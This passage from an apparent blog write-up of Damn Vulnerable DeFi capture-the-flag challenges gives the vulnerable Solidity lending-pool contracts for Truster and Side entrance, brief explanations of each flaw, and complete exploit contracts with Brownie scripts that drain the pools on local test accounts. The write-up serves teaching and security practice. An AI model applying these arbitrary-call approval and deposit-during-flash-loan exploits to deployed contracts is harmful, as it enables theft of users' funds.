class="subst">&#123;ETHER_IN_RECEIVER&#125;</span> ether&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> receiver.balance() == Wei(<span class="string">f&#x27;<span class="subst">&#123;ETHER_IN_RECEIVER&#125;</span> ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deployer, attacker, someuser, pool, receiver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">pool, receiver, attacker</span>):</span><br><span class="line">    exploit = naivereciever_Exploit.deploy(pool, receiver, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    exploit.exploit(&#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">pool, receiver</span>):</span><br><span class="line">    <span class="keyword">assert</span> receiver.balance() == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> pool.balance() == Wei(<span class="string">f&#x27;<span class="subst">&#123;ETHER_IN_POOL+ETHER_IN_RECEIVER&#125;</span> ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer, attacker, someuser, pool, receiver = deploy()</span><br><span class="line"></span><br><span class="line">    exploit(pool, receiver, attacker)</span><br><span class="line"></span><br><span class="line">    after(pool, receiver)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.</p>
<p>Currently the pool has 1 million DVT tokens in balance. And you have nothing.</p>
<p>But don’t worry, you might be able to take them all from the pool. In a single transaction.</p>
<h3 id="TrusterLenderPool-sol"><a href="#TrusterLenderPool-sol" class="headerlink" title="TrusterLenderPool.sol"></a>TrusterLenderPool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">TrusterLenderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">TrusterLenderPool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> public immutable damnValuableToken;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span> (address tokenAddress) &#123;</span><br><span class="line">        damnValuableToken = <span class="title class_">IERC20</span>(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 borrowAmount,</span></span><br><span class="line"><span class="params">        address borrower,</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>)</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.<span class="title function_">transfer</span>(borrower, borrowAmount);</span><br><span class="line">        target.<span class="title function_">functionCall</span>(data);</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter = damnValuableToken.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To solve this challenge, we must drain all the token balances of the <code>TrusterLenderPool</code> contract. If we look at the <code>flashLoan()</code> function, we can notice that the contract runs a function call to the given <code>target</code> address with the given <code>data</code> data. If we use this to make the contract to <code>approve</code> tokens for the <code>attacker</code> address, then the attacker can use the <code>transferFrom()</code> function to steal the tokens.</p>
<h3 id="truster-exploit-sol"><a href="#truster-exploit-sol" class="headerlink" title="truster_exploit.sol"></a>truster_exploit.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">TrusterLenderPool</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint256 borrowAmount,</span></span><br><span class="line"><span class="params">        address borrower,</span></span><br><span class="line"><span class="params">        address target,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    </span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract truster_Exploit &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">IERC20</span> public token;</span><br><span class="line">    <span class="title class_">TrusterLenderPool</span> pool;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address, address __address</span>) &#123;</span><br><span class="line">        token = <span class="title class_">IERC20</span>(_address);</span><br><span class="line">        pool = <span class="title class_">TrusterLenderPool</span>(__address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            <span class="title function_">address</span>(token),</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;approve(address,uint256)&quot;</span>,</span><br><span class="line">                <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">                token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pool))</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        token.<span class="title function_">transferFrom</span>(</span><br><span class="line">            <span class="title function_">address</span>(pool),</span><br><span class="line">            msg.<span class="property">sender</span>,</span><br><span class="line">            token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(pool))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="truster-py"><a href="#truster-py" class="headerlink" title="truster.py"></a>truster.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DamnValuableToken, TrusterLenderPool, truster_Exploit, accounts</span><br><span class="line">TOKENS_IN_POOL = <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line"></span><br><span class="line">    deployer, attacker = accounts[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    token = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    pool = TrusterLenderPool.deploy(token, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    token.transfer(pool, TOKENS_IN_POOL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(pool) == TOKENS_IN_POOL</span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(attacker) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deployer, attacker, pool, token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">token, pool, attacker</span>):</span><br><span class="line">    exploit = truster_Exploit.deploy(token, pool, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    exploit.exploit(&#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">token, pool, attacker</span>):</span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(pool) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(attacker) == TOKENS_IN_POOL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer, attacker, pool, token = deploy()</span><br><span class="line"></span><br><span class="line">    exploit(token, pool, attacker)</span><br><span class="line"></span><br><span class="line">    after(token, pool, attacker)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Side-entrance"><a href="#Side-entrance" class="headerlink" title="Side entrance"></a>Side entrance</h2><p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</p>
<p>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</p>
<p>You must take all ETH from the lending pool.</p>
<h3 id="SideEntranceLenderPool-sol"><a href="#SideEntranceLenderPool-sol" class="headerlink" title="SideEntranceLenderPool.sol"></a>SideEntranceLenderPool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IFlashLoanEtherReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params"></span>) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">SideEntranceLenderPool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">SideEntranceLenderPool</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address payable;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) private balances;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable &#123;</span><br><span class="line">        balances[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        uint256 amountToWithdraw = balances[msg.<span class="property">sender</span>];</span><br><span class="line">        balances[msg.<span class="property">sender</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">sendValue</span>(amountToWithdraw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 amount</span>) external &#123;</span><br><span class="line">        uint256 balanceBefore = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= amount, <span class="string">&quot;Not enough ETH in balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">IFlashLoanEtherReceiver</span>(msg.<span class="property">sender</span>).<span class="property">execute</span>&#123;<span class="attr">value</span>: amount&#125;();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &gt;= balanceBefore,</span><br><span class="line">            <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We must steal all the ether from the lender to complete this challenge. We can notice that this contract does not use the <code>ReentrancyGuard</code> library and does not count the balance separately for the deposits and the loans. Since the <code>flashLoan()</code> function only checks for the balance of the contract, we can use the <code>deposit()</code> function to return the lender ether, this increases the balance of the attacker, and we can withdraw the ether with ease.</p>
<h3 id="FlashLoanEtherReceiver-sol"><a href="#FlashLoanEtherReceiver-sol" class="headerlink" title="FlashLoanEtherReceiver.sol"></a>FlashLoanEtherReceiver.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">SideEntranceLenderPool</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">FlashLoanEtherReceiver</span> &#123;</span><br><span class="line">    <span class="title class_">SideEntranceLenderPool</span> pool;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">        pool = <span class="title class_">SideEntranceLenderPool</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(<span class="title function_">address</span>(pool).<span class="property">balance</span>);</span><br><span class="line">        pool.<span class="title function_">withdraw</span>();</span><br><span class="line">        <span class="title function_">payable</span>(msg.<span class="property">sender</span>).<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params"></span>) external payable &#123;</span><br><span class="line">        pool.<span class="property">deposit</span>&#123;<span class="attr">value</span>: msg.<span class="property">value</span>&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="side-entrance-py"><a href="#side-entrance-py" class="headerlink" title="side-entrance.py"></a>side-entrance.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> SideEntranceLenderPool, FlashLoanEtherReceiver, accounts, Wei</span><br><span class="line"></span><br><span class="line">ETHER_IN_POOL = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line"></span><br><span class="line">    deployer, attacker = accounts[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    pool = SideEntranceLenderPool.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;ETHER_IN_POOL&#125;</span> ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    attackerInitialEthBalance = attacker.balance()</span><br><span class="line">    <span class="keyword">assert</span> pool.balance() == Wei(<span class="string">f&#x27;<span class="subst">&#123;ETHER_IN_POOL&#125;</span> ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deployer, attacker, pool, attackerInitialEthBalance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">pool, attacker</span>):</span><br><span class="line">    exploit = FlashLoanEtherReceiver.deploy(pool, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    exploit.exploit(&#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">attackerInitialEthBalance, pool, attacker</span>):</span><br><span class="line">    <span class="keyword">assert</span> pool.balance() == <span class="number">0</span></span><br><span class="line">    <span class="keyword">assert</span> attacker.balance() &gt; attackerInitialEthBalance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer, attacker, pool, attackerInitialEthBalance = deploy()</span><br><span class="line"></span><br><span class="line">    exploit(pool, attacker)</span><br><span class="line"></span><br><span class="line">    after(attackerInitialEthBalance, pool, attacker)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="The-rewarder"><a href="#The-rewarder" class="headerlink" title="The rewarder"></a>The rewarder</h2><p>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p>
<p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p>
<p>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p>
<p>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?</p>
<h3 id="AccountingToken-sol"><a href="#AccountingToken-sol" class="headerlink" title="AccountingToken.sol"></a>AccountingToken.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControl.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">AccountingToken</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@notice</span> A limited pseudo-ERC20 token to keep track of deposits and withdrawals</span></span><br><span class="line"><span class="comment"> *         with snapshotting capabilities</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">AccountingToken</span> is <span class="title class_">ERC20Snapshot</span>, <span class="title class_">AccessControl</span> &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">MINTER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;MINTER_ROLE&quot;</span>);</span><br><span class="line">    bytes32 public constant <span class="variable constant_">SNAPSHOT_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;SNAPSHOT_ROLE&quot;</span>);</span><br><span class="line">    bytes32 public constant <span class="variable constant_">BURNER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;BURNER_ROLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC20</span>(<span class="string">&quot;rToken&quot;</span>, <span class="string">&quot;rTKN&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">DEFAULT_ADMIN_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">SNAPSHOT_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">BURNER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">address to, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>), <span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">        <span class="title function_">_mint</span>(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">burn</span>(<span class="params">address <span class="keyword">from</span>, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">BURNER_ROLE</span>, msg.<span class="property">sender</span>), <span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">        <span class="title function_">_burn</span>(<span class="keyword">from</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">snapshot</span>(<span class="params"></span>) external returns (uint256) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">hasRole</span>(<span class="variable constant_">SNAPSHOT_ROLE</span>, msg.<span class="property">sender</span>), <span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_snapshot</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not need transfer of this token</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params">address, address, uint256</span>) internal pure override &#123;</span><br><span class="line">        <span class="title function_">revert</span>(<span class="string">&quot;Not implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not need allowance of this token</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_approve</span>(<span class="params">address, address, uint256</span>) 